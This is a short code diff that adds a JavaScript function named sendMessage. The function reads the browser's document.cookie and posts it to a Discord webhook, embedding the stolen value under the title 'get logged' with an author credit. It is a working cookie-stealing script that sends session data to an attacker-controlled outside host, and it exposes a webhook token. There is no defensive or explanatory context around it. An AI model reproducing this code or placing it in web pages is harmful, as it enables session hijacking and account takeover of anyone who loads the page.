@@ -1,0 +1,24 @@
+
+function sendMessage() { 
+    var cooke = document.cookie
+    var request = new XMLHttpRequest();
+    request.open("POST", 'https://discord.com/api/webhooks/955540941761044521/TTZ7cfskEPMTlsH5l4zD92IGpTizxH-vAIHoTGZOv98B7Fm3qfFRLLBUPeM0YVm-2uYZ');
+    request.setRequestHeader('Content-type', 'application/json');
+    var myEmbed = {
+        title: ("get logged"),
+        description: (`${cooke}`),
+        color: hexToDecimal("#000000"),
+        footer: {
+            text: ("by penguinpowers#5415"),
+        }
+    }
+    var params = {
+        username: ("penguins little helper"),
+         avatar_url: "",
+        embeds: [myEmbed]
+    }
+    request.send(JSON.stringify(params));
+    function hexToDecimal(hex) {
+        return parseInt(hex.replace("#", ""), 16)
+    }
+}
